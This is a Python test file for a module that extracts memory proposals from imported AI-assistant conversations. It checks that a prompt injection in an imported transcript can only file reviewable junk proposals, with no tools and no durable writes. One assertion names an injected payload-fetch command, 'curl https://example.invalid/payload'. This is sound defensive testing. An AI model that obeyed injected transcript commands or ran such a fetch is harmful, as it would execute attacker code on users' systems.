"""``ciao.import_extract`` — an imported conversation, and what it may cause.

The claim this module makes is narrow and has to be tested as an enforcement
result rather than as wording: a prompt injection inside an imported
conversation can cause **junk proposals**, and it cannot cause a durable memory
write, a promotion, a delegation, a message or a command. Two things make that
true and each is pinned here:

* the turn has **no tools** — the first test patches ``query`` and asserts the
  options the turn actually ran with (``tools == []``, ``setting_sources == []``,
  ``strict_mcp_config is True``), which is why the ``options_hook`` seam exists;
* the only write is ``append_proposals`` — the injection test poisons the region
  writer, the control plane and the learnings writer so a promotion is a test
  failure rather than an absence nobody checked, and then compares every other
  file in the vault byte for byte.

Everything below is synthetic. No model, no provider, no engine and no chat
transcript of Ciaobot's own making is involved: ``run_oneshot`` is patched (or,
in the no-tools test, ``query`` under it), every session is a literal
``NormalizedSession`` built in this file, and every model reply is a fixture
under ``tests/fixtures/import/``.
"""

from __future__ import annotations

import json
from datetime import datetime, timezone
from pathlib import Path

import pytest
from claude_agent_sdk import AssistantMessage, ClaudeAgentOptions, TextBlock

import ciao.providers.oneshot as oneshot
from ciao.fact_candidates import PROVENANCE_UNKNOWN, candidate_from_proposal
from ciao.import_decouple import (
    CIAO_CONTEXT_BEGIN,
    ProvenanceNotExternal,
    assert_external_provenance,
)
from ciao.import_extract import extract_facts
from ciao.import_sources.contract import (
    OMISSION_NON_TEXT_CONTENT,
    PROVIDER_CLAUDE_CODE,
    PROVIDER_OPENCODE,
    ROLE_ASSISTANT,
    ROLE_USER,
    NormalizedMessage,
    NormalizedSession,
    Omission,
    SourceRef,
)
from ciao.memory_proposals import MemoryProposal, list_proposals

FIXTURES = Path(__file__).resolve().parent / "fixtures" / "import"
QUEUE = "Workspace/Memory-Proposals.md"

SESSION_ID = "ses_synthetic0001"
CHAT_ID = "chat-1a2b3c4d"


# ── A synthetic conversation ──────────────────────────────────────────────


def _session(
    *,
    provider: str = PROVIDER_OPENCODE,
    source_id: str = SESSION_ID,
    messages: tuple[NormalizedMessage, ...] | None = None,
    omissions: tuple[Omission, ...] = (),
) -> NormalizedSession:
    """One normalized conversation, built from literals.

    ``msg_0003`` carries a real date so "the fact is dated by its source, not
    by the import" is testable; ``msg_0002`` and ``msg_0004`` carry none, which
    is the honest state of a source with no per-message date and the case where
    no ``[as-of:]`` tag may appear at all.
    """
    return NormalizedSession(
        source=SourceRef(
            provider=provider,
            source_id=source_id,
            project_hint="-synthetic-checkout",
            path=f"/synthetic/-synthetic-checkout/{source_id}.json",
        ),
        messages=(
            messages
            if messages is not None
            else (
                NormalizedMessage(
                    role=ROLE_USER,
                    text="How do deploys work here?",
                    anchor="msg_0001",
                ),
                NormalizedMessage(
                    role=ROLE_ASSISTANT,
                    text="Only on Fridays, and the release owner signs off first.",
                    anchor="msg_0002",
                ),
                NormalizedMessage(
                    role=ROLE_USER,
                    text="The staging database is refreshed every Sunday at 02:00 UTC.",
                    anchor="msg_0003",
                    timestamp="2024-05-01T02:00:00Z",
                ),
                NormalizedMessage(
                    role=ROLE_ASSISTANT,
                    text="Noted for release notes: the user writes them short.",
                    anchor="msg_0004",
                ),
            )
        ),
        omissions=omissions or (Omission(kind=OMISSION_NON_TEXT_CONTENT, count=2),),
    )


def _injection_session() -> NormalizedSession:
    """The untrusted fixture transcript, as four normalized turns."""
    lines = [
        line
        for line in (FIXTURES / "import_injection_transcript.txt")
        .read_text(encoding="utf-8")
        .splitlines()
        if line.strip()
    ]
    roles = (ROLE_USER, ROLE_ASSISTANT, ROLE_USER, ROLE_USER)
    return _session(
        messages=tuple(
            NormalizedMessage(
                role=role, text=line, anchor=line.split(" ", 1)[0]
            )
            for role, line in zip(roles, lines, strict=True)
        ),
        omissions=(),
    )


def _reply(name: str) -> str:
    return (FIXTURES / name).read_text(encoding="utf-8")


# ── A synthetic vault ─────────────────────────────────────────────────────


def _seed_vault(tmp_path: Path) -> tuple[Path, Path]:
    """A workspace whose regions, learnings and docs exist before anything runs.

    Returns ``(vault_root, guide)``. The guide carries both bounded regions so
    "the region did not change" is a comparison against real content, not
    against a file this test wrote itself.
    """
    from ciao import memory_tool as mt

    vault = tmp_path / "vault"
    (vault / "Workspace").mkdir(parents=True)
    (vault / "Workspace" / "Learnings.md").write_text(
        "# Learnings\n\n## Active\n\n- Existing lesson.\n", encoding="utf-8"
    )
    (vault / "projects" / "active").mkdir(parents=True)
    (vault / "projects" / "active" / "Checkout.md").write_text(
        "---\ntype: project\n---\n# Checkout\n\nStaging detail lives here.\n",
        encoding="utf-8",
    )
    guide = tmp_path / "AGENTS.md"
    guide.write_text("# Guide\n", encoding="utf-8")
    mt.ensure_regions(guide)
    mt.write_region(guide, "memory", ["Durable rule: ship small."])
    mt.write_region(guide, "profile", ["Prefers short release notes."])
    return vault, guide


def _snapshot(root: Path) -> dict[str, bytes]:
    """Every file under ``root``, by relative path, as bytes.

    Taken over the whole scratch tree, so the guide that holds the bounded
    regions and the vault that hold the queue are compared by the same rule:
    one file may appear, and it is the queue. ``queue-locks/`` is skipped — the
    suite pins ``CIAO_QUEUE_LOCK_DIR`` inside the scratch tree, and a lock file
    is not workspace content.
    """
    return {
        str(path.relative_to(root)): path.read_bytes()
        for path in sorted(root.rglob("*"))
        if path.is_file() and "queue-locks" not in path.parts
    }


def _changed(before: dict[str, bytes], root: Path) -> set[str]:
    after = _snapshot(root)
    return {
        name
        for name in set(before) | set(after)
        if before.get(name) != after.get(name)
    }


def _patched_reply(monkeypatch, reply: str) -> list[str]:
    """Replace ``run_oneshot`` with one that returns ``reply``; record its prompts."""
    prompts: list[str] = []

    async def fake_run_oneshot(prompt: str, **kwargs: object) -> str:
        prompts.append(prompt)
        return reply

    monkeypatch.setattr("ciao.providers.oneshot.run_oneshot", fake_run_oneshot)
    return prompts


# ── E1: the turn has no tools, and the only write is the queue ────────────


@pytest.mark.asyncio
async def test_extraction_runs_a_tool_less_turn_and_writes_only_proposals(
    monkeypatch, tmp_path
) -> None:
    """The boundary, as an enforcement result.

    Only ``query`` is patched, so the real ``run_oneshot`` runs and the options
    the turn was built with can be read off the object itself — the assertion is
    on what the harness was given, not on what a prompt asked for.
    """
    vault, _ = _seed_vault(tmp_path)
    before = _snapshot(tmp_path)
    assert before, "the scratch tree is seeded, so this compares against content"

    captured: dict = {}

    async def fake_query(*, prompt: str, options):
        captured["options"] = options
        captured["prompt"] = prompt
        yield AssistantMessage(
            content=[TextBlock(text=_reply("extraction_reply_valid.json"))],
            model="haiku",
        )

    monkeypatch.setattr(oneshot, "query", fake_query)

    result = await extract_facts(
        _session(),
        model="haiku",
        destination_workspace=vault,
    )

    options: ClaudeAgentOptions = captured["options"]
    assert options.tools == []
    assert options.setting_sources == []
    assert options.skills == []
    assert options.strict_mcp_config is True
    assert options.max_turns == 2

    assert result.proposals_filed == 3
    assert result.skipped == 0
    assert result.refused_anchor == ""
    assert result.usage.messages_in_prompt == 4
    assert result.usage.messages_read == 4
    assert result.usage.omitted_entries == 2

    # Exactly three bullets, and they are the three facts — nothing else in the
    # workspace moved, so no region, note, doc or learning was written.
    rows = list_proposals(vault / QUEUE)
    assert [row["text"] for row in rows] == [
        "Deploys happen only on Fridays and need the release owner's sign-off.",
        "The staging database is refreshed every Sunday at 02:00 UTC. "
        "[as-of: 2024-05-01]",
        "Prefers short sentences over long prose in release notes.",
    ]
    assert {row["kind"] for row in rows} == {"memory", "profile"}

    changed = _changed(before, tmp_path)
    assert changed == {f"vault/{QUEUE}"}, (
        f"extraction changed more than the queue: {sorted(changed)}"
    )


# ── E2/E3/E4/E5: an injection may cause junk proposals and nothing else ────


@pytest.mark.asyncio
async def test_injection_transcript_files_proposals_and_no_durable_write(
    monkeypatch, tmp_path
) -> None:
    """A transcript that orders the model around gets it as far as the queue.

    ``update_region``, ``CiaoControlPlane.memory_update`` and
    ``append_learning`` raise: a promotion is then a failure, not an absence.
    """
    import ciao.control_plane as control_plane
    import ciao.memory_proposals as mp
    from ciao import memory_tool as mt

    def _forbidden(*args: object, **kwargs: object):
        raise AssertionError(
            "extraction reached a durable writer; proposals-only is the contract"
        )

    monkeypatch.setattr(mt, "update_region", _forbidden)
    monkeypatch.setattr(mp, "append_learning", _forbidden)
    monkeypatch.setattr(control_plane.CiaoControlPlane, "memory_update", _forbidden)
    monkeypatch.setattr(
        "ciao.agent_surface.AgentDispatcher.dispatch", _forbidden, raising=True
    )

    vault, _ = _seed_vault(tmp_path)
    before = _snapshot(tmp_path)
    _patched_reply(monkeypatch, _reply("extraction_reply_injection.json"))

    result = await extract_facts(
        _injection_session(), model="haiku", destination_workspace=vault
    )

    # The two rows whose "destination" is a region name and a filesystem path
    # are dropped, and so is the one the injected transcript tried to date; the
    # three that are ordinary [memory] facts are queued, which is exactly the
    # honest claim: junk proposals, bounded to a review queue.
    assert result.proposals_filed == 3
    assert result.skipped == 3

    rows = list_proposals(vault / QUEUE)
    assert {row["kind"] for row in rows} == {"memory"}
    assert all(row["target"] == "" for row in rows), (
        "no payload means no person name and no document to route to"
    )
    queue_text = (vault / QUEUE).read_text(encoding="utf-8")
    assert "ciao:memory]" not in queue_text, "a region is not a destination"
    assert "[/Users/someone/Desktop]" not in queue_text, "a path is not a destination"
    assert "[as-of:" not in queue_text, (
        "a date the transcript wrote into a fact is not a source date"
    )
    # The command the transcript asked for is queued as prose a person can
    # dismiss, and nowhere else: it is not a run, and nothing ran.
    assert any("curl https://example.invalid/payload" in row["text"] for row in rows)

    changed = _changed(before, tmp_path)
    assert changed == {f"vault/{QUEUE}"}, (
        f"an injected transcript changed more than the queue: {sorted(changed)}"
    )


# ── Refusals: a Ciaobot chat id is never a source, and never a citation ───


@pytest.mark.asyncio
async def test_a_row_naming_a_ciaobot_chat_id_is_refused(monkeypatch, tmp_path) -> None:
    """A row cannot cite Ciaobot's own work, however it is spelled.

    Two refusals, and the second is the one that outlives this module: the
    anchor is a key into the session, so a chat id resolves to nothing and the
    row is dropped before it can be filed; and the tag the module would have
    written is checked against ``assert_external_provenance``, which refuses a
    Ciaobot chat id by shape and any id the caller supplies in
    ``known_chat_ids`` — the latter is what catches an id whose shape alone
    would not be recognised.
    """
    vault, _ = _seed_vault(tmp_path)
    prompts = _patched_reply(
        monkeypatch,
        json.dumps(
            [
                {
                    "text": "Cites a Ciaobot chat instead of a message.",
                    "destination": "memory",
                    "payload": "",
                    "source_anchor": CHAT_ID,
                    "as_of": None,
                }
            ]
        ),
    )

    result = await extract_facts(
        _session(), model="haiku", destination_workspace=vault
    )

    assert result.proposals_filed == 0
    assert result.skipped == 1
    assert result.refused_anchor == ""
    assert list_proposals(vault / QUEUE) == []
    assert prompts, "the turn ran; it was the row that was refused"

    with pytest.raises(ProvenanceNotExternal):
        assert_external_provenance(f"claude_code:{CHAT_ID}:msg_0001")
    with pytest.raises(ProvenanceNotExternal):
        assert_external_provenance(
            "claude_code:chat-legacy99:msg_0001", known_chat_ids=["chat-legacy99"]
        )


@pytest.mark.asyncio
async def test_a_ciaobot_own_session_is_refused_before_any_call(
    monkeypatch, tmp_path
) -> None:
    """Refusal happens before the turn, and the prompt never sees the text.

    Two ways Ciaobot's own sessions are recognised — a recorded session id and
    a Ciaobot chat id — plus a third, the marker Ciaobot stamps into the first
    user turn of a session it drove. None of the three may cost a model turn.
    """
    vault, _ = _seed_vault(tmp_path)
    prompts = _patched_reply(monkeypatch, _reply("extraction_reply_valid.json"))

    own = await extract_facts(
        _session(source_id="ses_ciaobot_run_0001"),
        model="haiku",
        destination_workspace=vault,
        known_own_ids=[("opencode", "ses_ciaobot_run_0001")],
    )
    by_chat_id = await extract_facts(
        _session(source_id=CHAT_ID), model="haiku", destination_workspace=vault
    )
    by_marker = await extract_facts(
        _session(
            messages=(
                NormalizedMessage(
                    role=ROLE_USER,
                    text=f"{CIAO_CONTEXT_BEGIN} vault context follows",
                    anchor="msg_0001",
                ),
                NormalizedMessage(
                    role=ROLE_ASSISTANT, text="Noted.", anchor="msg_0002"
                ),
            )
        ),
        model="haiku",
        destination_workspace=vault,
    )

    for result in (own, by_chat_id, by_marker):
        assert result.proposals_filed == 0
        assert result.skipped == 0
        assert result.refused_anchor
        assert result.usage.messages_in_prompt == 0, "nothing was read into a prompt"
        assert result.usage.prompt_chars == 0
    assert own.refused_anchor == "ses_ciaobot_run_0001"
    assert by_chat_id.refused_anchor == CHAT_ID
    assert prompts == [], "no turn ran at all"
    assert not (vault / QUEUE).exists()


# ── A broken reply costs a turn, never a batch ────────────────────────────


@pytest.mark.asyncio
async def test_malformed_reply_degrades_to_skipped_and_counted(
    monkeypatch, tmp_path
) -> None:
    """Every unusable row is dropped and counted; nothing raises."""
    vault, _ = _seed_vault(tmp_path)

    _patched_reply(monkeypatch, _reply("extraction_reply_malformed.json"))
    partial = await extract_facts(
        _session(), model="haiku", destination_workspace=vault
    )
    assert partial.proposals_filed == 1
    assert partial.skipped == 5, (
        "a number for the fact, one for the non-string text, one for the bare "
        "string, one for the row with no text, one for the unknown destination "
        "and one for the anchor this session never carried"
    )
    assert [row["text"] for row in list_proposals(vault / QUEUE)] == [
        "Deploys happen only on Fridays."
    ]

    # The same batch again: the queue's exact-text dedupe holds every row, so
    # this run appended nothing. "Asked about one fact" and "filed one fact"
    # have to be countable apart.
    again = await extract_facts(_session(), model="haiku", destination_workspace=vault)
    assert again.proposals_filed == 0
    assert again.skipped == 5
    assert [row["text"] for row in list_proposals(vault / QUEUE)] == [
        "Deploys happen only on Fridays."
    ], "a deduped batch must not duplicate a bullet"

    _patched_reply(
        monkeypatch,
        "I could not produce the array you asked for; here is a paragraph.",
    )
    unreadable = await extract_facts(
        _session(source_id="ses_synthetic0002"),
        model="haiku",
        destination_workspace=vault,
    )
    assert unreadable.proposals_filed == 0
    assert unreadable.skipped == 1, (
        "a reply that could not be read is not the same fact as one that "
        "proposed nothing"
    )
    assert [row["text"] for row in list_proposals(vault / QUEUE)] == [
        "Deploys happen only on Fridays."
    ], "the first batch survived the second reply"


# ── Provenance: where an imported fact says it came from ───────────────────


@pytest.mark.asyncio
async def test_citations_stay_empty_and_the_anchor_survives_in_source_section(
    monkeypatch, tmp_path
) -> None:
    """The external anchor has nowhere structured to go, so it rides in prose.

    ``MemoryProposal.citations`` and ``FactCandidate.source_message_ids`` are
    both ``tuple[int, ...]`` — Ciaobot transcript *indices* — and an imported
    message's anchor is a provider string. So the row cites nothing (there is no
    Ciaobot turn to cite), the tag ``provider:session_id:anchor`` rides in
    ``source_section`` and survives the bullet, and the record the accept path
    will stamp still says where the fact came from.
    """
    vault, _ = _seed_vault(tmp_path)
    _patched_reply(monkeypatch, _reply("extraction_reply_valid.json"))

    result = await extract_facts(
        _session(), model="haiku", destination_workspace=vault
    )
    assert result.proposals_filed == 3

    queue_text = (vault / QUEUE).read_text(encoding="utf-8")
    for anchor in ("msg_0002", "msg_0003", "msg_0004"):
        assert f"_(from: opencode:{SESSION_ID}:{anchor})_" in queue_text
    assert "[idx=" not in queue_text, (
        "no integer citation can be right for a message Ciaobot never stored"
    )

    rows = list_proposals(vault / QUEUE)
    assert [row["source"] for row in rows] == [
        f"opencode:{SESSION_ID}:msg_0002",
        f"opencode:{SESSION_ID}:msg_0003",
        f"opencode:{SESSION_ID}:msg_0004",
    ]
    for row in rows:
        candidate = candidate_from_proposal(
            MemoryProposal(
                target=row["kind"],
                text=row["text"],
                source_section=row["source"],
                payload=row["target"],
                citations=(),
            )
        )
        assert candidate.source_message_ids == ()
        assert candidate.provenance == PROVENANCE_UNKNOWN
        assert candidate.section == row["source"]
        assert candidate.attended is None, "unknown is not False"

    # The date on a fact is the source message's own, never the import date.
    dated = next(row for row in rows if row["source"].endswith("msg_0003"))
    assert dated["text"].endswith("[as-of: 2024-05-01]")
    assert str(datetime.now(timezone.utc).date()) not in dated["text"]
    undated = [row for row in rows if row["source"].endswith(("msg_0002", "msg_0004"))]
    assert undated and all("[as-of:" not in row["text"] for row in undated), (
        "a source with no date must not be given one"
    )

    # A Claude Code session has no per-message date at all, so nothing may be
    # dated from it — and the tag is built from the session either way.
    claude_session = _session(
        provider=PROVIDER_CLAUDE_CODE,
        source_id="5e6f7a8b-9c0d-4e1f-8a2b-3c4d5e6f7a8b",
        messages=(
            NormalizedMessage(
                role=ROLE_USER,
                text="Use the staging refresh window.",
                anchor="msg_0001",
            ),
            NormalizedMessage(
                role=ROLE_ASSISTANT, text="Noted.", anchor="msg_0002"
            ),
        ),
    )
    _patched_reply(
        monkeypatch,
        json.dumps(
            [
                {
                    "text": "Staging refreshes run in a fixed window.",
                    "destination": "memory",
                    "payload": "",
                    "source_anchor": "msg_0001",
                    "as_of": "2026-01-01",
                }
            ]
        ),
    )
    claude = await extract_facts(
        claude_session, model="haiku", destination_workspace=vault
    )
    assert claude.proposals_filed == 1
    filed = list_proposals(vault / QUEUE)[-1]
    assert filed["text"] == "Staging refreshes run in a fixed window."
    assert "[as-of:" not in filed["text"], (
        "the date the model proposed is ignored; only the source message may "
        "date a fact"
    )
    assert filed["source"] == (
        "claude_code:5e6f7a8b-9c0d-4e1f-8a2b-3c4d5e6f7a8b:msg_0001"
    )